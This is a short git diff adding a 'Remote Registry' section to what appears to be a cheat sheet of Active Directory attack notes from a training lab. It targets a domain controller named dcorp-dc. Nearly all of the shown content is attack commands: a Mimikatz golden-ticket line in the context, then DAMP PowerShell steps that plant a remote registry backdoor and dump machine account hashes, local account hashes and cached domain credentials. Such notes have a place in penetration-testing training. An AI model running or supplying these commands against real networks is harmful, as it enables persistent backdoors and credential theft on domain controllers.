@@ -542,3 +542,13 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Verbose`
 - On remote machine, remove the permissions:
   - `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Remove`
+
+**Remote Registry**
+- Using DAMP, with admin privs on remote machine
+  - `Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose`
+- As student1, retrive machine account hash
+  - `Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose`
+- Retrieve local account hash
+  - `Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose`
+- Retrieve domain cached credentials
+  - `Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose`
